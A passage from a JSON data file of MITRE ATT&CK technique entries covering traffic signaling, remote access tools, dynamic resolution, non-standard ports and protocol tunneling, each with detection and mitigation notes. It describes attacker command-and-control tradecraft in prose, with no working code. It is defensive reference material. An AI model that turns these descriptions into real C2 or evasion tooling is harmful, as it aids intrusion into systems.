a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r <a href=\"https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hartrell cd00r 2002)</a>, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives. <a href=\"https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Synful Knock Evolution)</a> <a href=\"https://www.mandiant.com/resources/synful-knock-acis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant - Synful Knock)</a> <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement. <a href=\"https://www.bleepingcomputer.com/news/security/ryuk-ransomware-uses-wake-on-lan-to-encrypt-offline-devices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer - Ryuk WoL)</a> <a href=\"https://www.amd.com/system/files/TechDocs/20213.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AMD Magic Packet)</a>","detection":"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\nThe Wake-on-LAN magic packet consists of 6 bytes of <code>FF</code> followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt. <a href=\"https://gitlab.com/wireshark/wireshark/-/wikis/WakeOnLAN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitLab WakeOnLAN)</a>","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation","Process: Process Creation","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable Wake-on-LAN if it is not needed within an environment."}],"subTechniques":[{"id":"T1205.001","name":"Port Knocking","description":"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r <a href=\"https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hartrell cd00r 2002)</a>, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.","detection":"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."}]},{"id":"T1205.002","name":"Socket Filters","description":"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the <code>libpcap</code> library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. <a href=\"http://recursos.aldabaknocking.com/libpcapHakin9LuisMartinGarcia.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: haking9 libpcap network sniffing)</a> Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling. <a href=\"https://exatrack.com/public/Tricephalic_Hellkeeper.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: exatrack bpf filters passive backdoors)</a> <a href=\"https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Leonardo Turla Penquin May 2020)</a>\n\nFilters can be installed on any Unix-like platform with <code>libpcap</code> installed or on Windows hosts using <code>Winpcap</code>.  Adversaries may use either <code>libpcap</code> with <code>pcap_setfilter</code> or the standard library function <code>setsockopt</code> with <code>SO_ATTACH_FILTER</code> options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.","detection":"Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy. <a href=\"https://www.crowdstrike.com/blog/how-to-hunt-for-decisivearchitect-and-justforfun-implant/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: crowdstrike bpf socket filters)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."}]}]},{"id":"T1219","name":"Remote Access Tools","description":"An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management. <a href=\"https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Living off the Land)</a> <a href=\"https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike 2015 Global Threat Report)</a> <a href=\"https://blog.crysys.hu/2013/03/teamspy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrySyS Blog TeamSpy)</a> Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nRemote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.\n\nInstallation of many remote access tools may also include persistence (e.g., the software's installation routine creates a Windows Service). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop). <a href=\"https://support.google.com/chrome/answer/1649523\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Chrome Remote Desktop)</a> <a href=\"https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chrome Remote Desktop)</a>","detection":"Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.\n\nDomain Fronting may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services."},{"id":"M1034","name":"Limit Hardware Installation","description":"Block the use of IP-based KVM devices within the network if they are not required."},{"id":"M1037","name":"Filter Network Traffic","description":"Properly configure firewalls, application firewalls, and proxies to limit outgoing traffic to sites and services used by remote access software."},{"id":"M1038","name":"Execution Prevention","description":"Use application control to mitigate installation and use of unapproved software that can be used for remote access."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling unnecessary remote connection functionality, including both unapproved software installations and specific features built into supported applications."}],"subTechniques":[{"id":"T1219.001","name":"IDE Tunneling","description":"Adversaries may abuse Integrated Development Environment (IDE) software with remote development features to establish an interactive command and control channel on target systems within a network. IDE tunneling combines SSH, port forwarding, file sharing, and debugging into a single secure connection, letting developers work on remote systems as if they were local. Unlike SSH and port forwarding, IDE tunneling encapsulates an entire session and may use proprietary tunneling protocols alongside SSH, allowing adversaries to blend in with legitimate development workflows. Some IDEs, like Visual Studio Code, also provide CLI tools (e.g., <code>code tunnel</code>) that adversaries may use to programmatically establish tunnels and generate web-accessible URLs for remote access. These tunnels can be authenticated through accounts such as GitHub, enabling the adversary to control the compromised system via a legitimate developer portal. <a href=\"https://www.sentinelone.com/labs/operation-digital-eye-chinese-apt-compromises-critical-digital-infrastructure-via-visual-studio-code-tunnels/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sentinelone operationDigitalEye Dec 2024)</a> <a href=\"https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 Chinese VSCode 06 September 2024)</a> <a href=\"https://medium.com/@truvis.thornton/visual-studio-code-embedded-reverse-shell-and-how-to-block-create-sentinel-detection-and-add-e864ebafaf6d\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Thornton tutorial VSCode shell September 2023)</a>\n\nAdditionally, adversaries may use IDE tunneling for persistence. Some IDEs, such as Visual Studio Code and JetBrains, support automatic reconnection. Adversaries may configure the IDE to auto-launch at startup, re-establishing the tunnel upon execution. Compromised developer machines may also be exploited as jump hosts to move further into the network.\n\nIDE tunneling tools may be built-in or installed as IDE Extensions.","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use Group Policies to require user authentication by disabling anonymous tunnel access, preventing any unauthenticated tunnel creation or usage. Disable the Visual Studio Dev Tunnels feature to block tunnel-related commands, allowing only minimal exceptions for utility functions (unset, echo, ping, and user). Restrict tunnel access to approved Microsoft Entra tenant IDs by specifying allowed tenants; all other users are denied access by default. <a href=\"https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/policies\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dev Tunnels Group Policy Mitigation)</a> <a href=\"https://techcommunity.microsoft.com/blog/azuredevcommunityblog/manage-dev-tunnels-with-group-policies/4149472\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dev Tunnels Group Policies)</a>"}]},{"id":"T1219.002","name":"Remote Desktop Software","description":"An adversary may use legitimate desktop support software to establish an interactive command and control channel to target systems within networks. Desktop support software provides a graphical interface for remotely controlling another computer, transmitting the display output, keyboard input, and mouse control between devices using various protocols. Desktop support software, such as <code>VNC</code>, <code>Team Viewer</code>, <code>AnyDesk</code>, <code>ScreenConnect</code>, <code>LogMein</code>, <code>AmmyyAdmin</code>, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment. <a href=\"https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Living off the Land)</a> <a href=\"https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike 2015 Global Threat Report)</a> <a href=\"https://blog.crysys.hu/2013/03/teamspy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrySyS Blog TeamSpy)</a> \n \nRemote access modules/features may also exist as part of otherwise existing software such as Zoom or Google Chrome’s Remote Desktop. <a href=\"https://support.google.com/chrome/answer/1649523\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Chrome Remote Desktop)</a> <a href=\"https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chrome Remote Desktop)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Properly configure firewalls, application firewalls, and proxies to limit outgoing traffic to sites and services used by remote access software."},{"id":"M1038","name":"Execution Prevention","description":"Use application control to mitigate installation and use of unapproved software that can be used for remote access."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling unnecessary remote connection functionality, including both unapproved software installations and specific features built into supported applications."}]},{"id":"T1219.003","name":"Remote Access Hardware","description":"An adversary may use legitimate remote access hardware to establish an interactive command and control channel to target systems within networks. These services, including IP-based keyboard, video, or mouse (KVM) devices such as TinyPilot and PiKVM, are commonly used as legitimate tools and may be allowed by peripheral device policies within a target environment.  \n\nRemote access hardware may be physically installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote session with the target system. Using hardware-based remote access tools may allow threat actors to bypass software security solutions and gain more control over the compromised device(s). <a href=\"https://unit42.paloaltonetworks.com/north-korean-it-workers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Unit 42 North Korean IT Workers 2024)</a> <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/mitigating-dprk-it-worker-threat/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence DPRK IT Workers 2024)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[{"id":"M1034","name":"Limit Hardware Installation","description":"Block the use of IP-based KVM devices within the network if they are not required."}]}]},{"id":"T1568","name":"Dynamic Resolution","description":"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control. <a href=\"http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos CCleanup 2017)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye POSHSPY April 2017)</a> <a href=\"https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Sednit 2017 Activity)</a>","detection":"Detecting dynamically generated C2 can be challenging due to the number of different algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There are multiple approaches to detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more <a href=\"https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Data Driven Security DGA)</a>. CDN domains may trigger these detections due to the format of their domain names. In addition to detecting algorithm generated domains based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"In some cases a local DNS sinkhole may be used to help prevent behaviors associated with dynamic resolution."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Malware researchers can reverse engineer malware variants that use dynamic resolution and determine future C2 infrastructure that the malware will attempt to contact, but this is a time and resource intensive effort. <a href=\"http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason Dissecting DGAs)</a> <a href=\"https://umbrella.cisco.com/blog/2015/02/18/at-high-noon-algorithms-do-battle/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Umbrella DGA Brute Force)</a>"}],"subTechniques":[{"id":"T1568.001","name":"Fast Flux DNS","description":"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record. <a href=\"https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-1/#gref\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MehtaFastFluxPt1)</a> <a href=\"https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-2/#gref\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MehtaFastFluxPt2)</a> <a href=\"https://www.welivesecurity.com/2017/01/12/fast-flux-networks-work/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fast Flux - Welivesecurity)</a>\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution. <a href=\"https://www.welivesecurity.com/2017/01/12/fast-flux-networks-work/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fast Flux - Welivesecurity)</a>\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.","detection":"In general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection.","platforms":["Linux","macOS","Windows","ESXi"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Connection Creation"],"mitigations":[]},{"id":"T1568.002","name":"Domain Generation Algorithms","description":"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions. <a href=\"http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason Dissecting DGAs)</a> <a href=\"https://umbrella.cisco.com/blog/2016/10/10/domain-generation-algorithms-effective/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Umbrella DGA)</a> <a href=\"https://unit42.paloaltonetworks.com/threat-brief-understanding-domain-generation-algorithms-dga/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 DGA Feb 2019)</a>\n\nDGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders. <a href=\"http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason Dissecting DGAs)</a> <a href=\"https://umbrella.cisco.com/blog/2016/10/10/domain-generation-algorithms-effective/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Umbrella DGA)</a> <a href=\"http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos CCleanup 2017)</a> <a href=\"https://medium.com/@yvyuz/a-death-match-of-domain-generation-algorithms-a5b5dbdc1c6e\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Akamai DGA Mitigation)</a>\n\nAdversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control. <a href=\"http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos CCleanup 2017)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye POSHSPY April 2017)</a> <a href=\"https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Sednit 2017 Activity)</a>","detection":"Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more. <a href=\"https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Data Driven Security DGA)</a> CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.\n\nMachine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA. <a href=\"http://csis.pace.edu/~ctappert/srd2017/2017PDF/d4.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pace University Detecting DGA May 2017)</a> Another approach is to use deep learning to classify domains as DGA-generated. <a href=\"https://arxiv.org/pdf/1611.00791.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Predicting DGA)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"In some cases a local DNS sinkhole may be used to help prevent DGA-based command and control at a reduced cost."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Malware researchers can reverse engineer malware variants that use DGAs and determine future domains that the malware will attempt to contact, but this is a time and resource intensive effort. <a href=\"http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason Dissecting DGAs)</a> <a href=\"https://umbrella.cisco.com/blog/2015/02/18/at-high-noon-algorithms-do-battle/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Umbrella DGA Brute Force)</a> Malware is also increasingly incorporating seed values that can be unique for each instance, which would then need to be determined to extract future generated domains. In some cases, the seed that a particular sample uses can be extracted from DNS traffic. <a href=\"https://medium.com/@yvyuz/a-death-match-of-domain-generation-algorithms-a5b5dbdc1c6e\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Akamai DGA Mitigation)</a> Even so, there can be thousands of possible domains generated per day; this makes it impractical for defenders to preemptively register all possible C2 domains due to the cost."}]},{"id":"T1568.003","name":"DNS Calculation","description":"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel. <a href=\"http://www.crowdstrike.com/blog/whois-numbered-panda/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Meyers Numbered Panda)</a>\n\nOne implementation of DNS Calculation is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic. <a href=\"http://www.crowdstrike.com/blog/whois-numbered-panda/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Meyers Numbered Panda)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2014/09/darwins-favorite-apt-group-2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Moran 2014)</a> <a href=\"https://blog.rapid7.com/2013/08/26/upcoming-g20-summit-fuels-espionage-operations/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rapid7G20Espionage)</a>","detection":"Detection for this technique is difficult because it would require knowledge of the specific implementation of the port calculation algorithm. Detection may be possible by analyzing DNS records if the algorithm is known.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[]}]},{"id":"T1571","name":"Non-Standard Port","description":"Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 <a href=\"https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Elfin Mar 2019)</a> or port 587 <a href=\"https://www.fortinet.com/blog/threat-research/analysis-of-new-agent-tesla-spyware-variant.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fortinet Agent Tesla April 2018)</a> as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings. <a href=\"https://x.com/TheDFIRReport/status/1498657772254240768\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: change_rdp_port_conti)</a>","detection":"Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports for that particular network segment."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."}],"subTechniques":[]},{"id":"T1572","name":"Protocol Tunneling","description":"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. <a href=\"https://www.ssh.com/ssh/tunneling\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SSH Tunneling)</a> <a href=\"https://www.sygnia.co/blog/abyss-locker-ransomware-attack-analysis/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia Abyss Locker 2025)</a> \n\nProtocol Tunneling may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets. <a href=\"https://www.bleepingcomputer.com/news/security/new-godlua-malware-evades-traffic-monitoring-via-dns-over-https/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BleepingComp Godlua JUL19)</a> \n\nAdversaries may also leverage Protocol Tunneling in conjunction with Proxy and/or Protocol or Service Impersonation to further conceal C2 communications and infrastructure.","detection":"Monitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. \n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect 